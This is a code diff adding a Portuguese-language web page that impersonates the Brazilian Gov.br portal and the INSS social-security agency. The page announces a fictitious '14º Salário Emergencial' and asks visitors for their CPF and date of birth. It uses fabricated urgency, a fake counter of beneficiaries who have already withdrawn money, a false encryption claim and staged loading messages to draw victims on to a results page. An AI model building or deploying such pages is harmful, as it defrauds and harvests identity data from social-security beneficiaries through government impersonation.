@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Gov.br - Sistema de Abonos</title>
+    <style>
+        body { font-family: 'Rawline', sans-serif, Arial; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
+        
+        /* Faixa de Urgência Intriguante */
+        .top-alert { background: #d93025; color: white; text-align: center; padding: 8px; font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+
+        .gov-bar { background: #fff; padding: 12px 20px; border-bottom: 2px solid #004088; display: flex; align-items: center; justify-content: space-between; }
+        .gov-bar img { height: 24px; }
+
+        .container { max-width: 500px; margin: 30px auto; padding: 15px; }
+
+        .card-consulta { background: white; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid #004088; padding: 35px 25px; position: relative; }
+        
+        /* Badge de Lote Liberado */
+        .lote-badge { position: absolute; top: -15px; right: 20px; background: #ffcd07; color: #004088; padding: 5px 15px; border-radius: 4px; font-size: 11px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+
+        .inss-logo-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+        .inss-logo-header img { height: 35px; }
+
+        h1 { font-size: 22px; color: #004088; margin: 0 0 15px 0; font-weight: 800; line-height: 1.2; }
+        
+        /* Texto Intriguante */
+        .intro-text { background: #f0f7ff; border-radius: 6px; padding: 15px; margin-bottom: 25px; border-left: 4px solid #1351b4; }
+        .intro-text p { font-size: 14px; margin: 0; color: #004088; font-weight: 500; }
+
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 8px; }
+        input { width: 100%; padding: 14px; border: 1px solid #888; border-radius: 4px; font-size: 16px; box-sizing: border-box; background: #fff; outline: none; }
+        
+        .btn-consultar { 
+            background: #1351b4; color: white; border: none; padding: 18px; width: 100%; 
+            border-radius: 50px; font-weight: bold; cursor: pointer; text-transform: uppercase; 
+            font-size: 15px; margin-top: 10px; box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
+        }
+
+        .counter-box { margin-top: 25px; text-align: center; font-size: 12px; color: #666; }
+        .counter-box b { color: #1d8032; }
+
+        /* Loader Igual ao Resultado */
+        #loader-container {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.98); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #004088; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .load-txt { color: #004088; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div id="loader-container">
+        <div class="spinner"></div>
+        <div class="load-txt" id="status-text">CONECTANDO AO PORTAL...</div>
+    </div>
+
+    <div class="top-alert">⚠️ SISTEMA DE PAGAMENTOS: ÚLTIMO LOTE DISPONÍVEL PARA CONSULTA</div>
+
+    <div class="gov-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" alt="Gov.br">
+        <span style="font-size: 11px; font-weight: bold; color: #666;">PREVIDÊNCIA SOCIAL</span>
+    </div>
+
+    <div class="container">
+        <div class="card-consulta">
+            <div class="lote-badge">LOTE 2024/2025 ATIVO</div>
+            
+            <div class="inss-logo-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/03/Logo_do_INSS.svg/1024px-Logo_do_INSS.svg.png" alt="INSS">
+            </div>
+
+            <h1>Consulte seu 14º Salário Emergencial</h1>
+            
+            <div class="intro-text">
+                <p>O sistema identificou novas liberações de abonos acumulados. Verifique se o seu CPF possui valores retidos prontos para saque.</p>
+            </div>
+
+            <div class="form-group">
+                <label>CPF do Beneficiário</label>
+                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
+            </div>
+
+            <div class="form-group">
+                <label>Data de Nascimento</label>
+                <input type="text" id="nasc" placeholder="dd/mm/aaaa">
+            </div>
+
+            <button class="btn-consultar" onclick="iniciarConsulta()">Verificar Disponibilidade</button>
+
+            <div class="counter-box">
+                🟢 <b>41.287</b> beneficiários já realizaram o saque hoje.
+            </div>
+        </div>
+        
+        <p style="text-align: center; font-size: 10px; color: #aaa; margin-top: 20px;">
+            Este portal utiliza criptografia de ponta a ponta para garantir a segurança dos seus dados.
+        </p>
+    </div>
+
+    <script>
+        function iniciarConsulta() {
+            const cpf = document.getElementById('cpf').value;
+            if(cpf.length < 11) {
+                alert("Por favor, informe um CPF válido para realizar a busca.");
+                return;
+            }
+
+            const loader = document.getElementById('loader-container');
+            const txt = document.getElementById('status-text');
+            
+            loader.style.display = 'flex';
+
+            setTimeout(() => { txt.innerHTML = "LOCALIZANDO REGISTROS DE ABONO..."; }, 1500);
+            setTimeout(() => { txt.innerHTML = "CONSULTANDO FUNDOS DISPONÍVEIS..."; }, 3000);
+            setTimeout(() => { txt.innerHTML = "ORGANIZANDO EXTRATO DE PAGAMENTO..."; }, 4500);
+
+            setTimeout(() => {
+                window.location.href = "resultado.html";
+            }, 6000);
+        }
+    </script>
+
+</body>
+</html>
